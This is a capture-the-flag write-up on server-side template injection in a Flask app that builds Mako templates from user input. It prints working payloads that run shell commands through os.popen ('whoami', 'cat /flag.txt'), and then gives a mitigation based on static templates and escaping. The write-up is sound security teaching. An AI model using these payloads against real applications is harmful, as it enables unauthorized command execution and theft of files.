
### Challenge Description

There is a new trend involving an application that generates “spooky” names for users. However, users later discovered that their real names were also being modified, causing issues in their personal lives.
Our objective is to analyze and compromise this application.

---

## Initial Analysis

We begin by downloading the provided files:

```python
❯ tree

 .
├──  build-docker.sh
├──  challenge
│   ├──  application
│   │   ├──  __pycache__
│   │   │   └──  main.cpython-313.pyc
│   │   ├──  blueprints
│   │   │   ├──  __pycache__
│   │   │   │   └──  routes.cpython-313.pyc
│   │   │   └──  routes.py
│   │   ├──  main.py
│   │   ├──  static
│   │   │   ├──  css
│   │   │   │   ├──  index.css
│   │   │   │   └──  nes.css
│   │   │   └──  images
│   │   │       └──  vamp.png
│   │   ├──  templates
│   │   │   └──  index.html
│   │   └──  util.py
│   └──  run.py
├──  config
│   └── 󱁻 supervisord.conf
├──  Dockerfile
└──  flag.txt
```

The project structure reveals that this is a **Python web application (Flask)** running inside a Docker container.

When reviewing the `Dockerfile`, we observe the library versions in use:

```bash
RUN pip install Flask==2.0.0 mako flask_mako Werkzeug==2.0.0
```

The **Mako** library is known to have had security vulnerabilities in the past and, when used incorrectly, can be vulnerable to **Server-Side Template Injection (SSTI)**.

---

## Identifying the SSTI Vulnerability

While enumerating the source code, we identified the vulnerable point in the `util.py` file:

```bash
cat challenge/application/util.py
```

Relevant code:

```python
from mako.template import Template

def generate_render(converted_fonts):
    result = '''
        <tr>
            <td>{0}</td>
        </tr>
        <tr>
            <td>{1}</td>
        </tr>
        <tr>
            <td>{2}</td>
        </tr>
        <tr>
            <td>{3}</td>
        </tr>
    '''.format(*converted_fonts)

    return Template(result).render()
```

The issue lies in the `generate_render` function.
Here, the template is dynamically constructed using `.format()` with user-controlled data and then passed directly to `Template(...).render()`.

This means that if user input contains expressions such as `${...}`, **Mako will interpret them as code**, allowing arbitrary code execution.

Additionally, the `font4` input source allows special characters such as `$`, `{}`, `(`, `)`, `'`, `"`, which significantly simplifies exploitation.

---

## Exploitation

When visiting the web application, we are prompted to enter a name.
To confirm the SSTI vulnerability, we submit the following test payload:

```text
${7*7}
```

<img src="/budahacksecurity/uploads/md_images/spookifier/spooki.png" style="max-width:100%; border-radius:8px;">

Result:

<img src="/budahacksecurity/uploads/md_images/spookifier/spooki2.png" style="max-width:100%; border-radius:8px;">

The application returns the value `49`, confirming that expressions are being evaluated on the server side.

This confirms the presence of **Server-Side Template Injection**.

---

## Remote Command Execution (RCE)

Next, we leverage a **PayloadsAllTheThings** payload to achieve remote command execution:

```mako
<% import os; x=os.popen('whoami').read() %> ${x}
```

The output confirms that the command is executed on the server.

<img src="/budahacksecurity/uploads/md_images/spookifier/spooki3.png" style="max-width:100%; border-radius:8px;">

Finally, we use the following payload to read the flag:

```mako
<% import os; x=os.popen('cat /flag.txt').read() %> ${x}
```

With this, we successfully retrieve the challenge flag.

---

## Mitigation

The primary rule to prevent this type of vulnerability is **never to build templates dynamically using user input inside the template source**.

The correct approach is to use a static template and pass user values as variables, applying proper HTML escaping:

```python
from mako.template import Template

TEMPLATE = Template("""
<tr><td>${f1 | h}</td></tr>
<tr><td>${f2 | h}</td></tr>
<tr><td>${f3 | h}</td></tr>
<tr><td>${f4 | h}</td></tr>
""")

def generate_render(converted_fonts):
    f1, f2, f3, f4 = converted_fonts
    return TEMPLATE.render(f1=f1, f2=f2, f3=f3, f4=f4)
```

* The template is **static**
* The `| h` filter applies **HTML escaping**
* This prevents **SSTI and XSS** attacks

---

### Mitigation Proof

In the video below, we can observe that SSTI and XSS payloads that were previously executed by the application are now rendered strictly as plain text.
By comparing the vulnerable version of the application with the mitigated version, we confirm that both SSTI and XSS vulnerabilities have been successfully mitigated.

<video controls width="100%" preload="metadata">
  <source src="uploads/md_images/spookifier/spoo.mp4" type="video/mp4">
  Your browser does not support MP4 video.
</video>

---

## Conclusion

The improper use of the Mako template engine allowed server-side code injection, leading to remote command execution and the disclosure of sensitive files.
This challenge highlights the importance of handling templates securely and never rendering user-controlled input without proper validation and escaping.




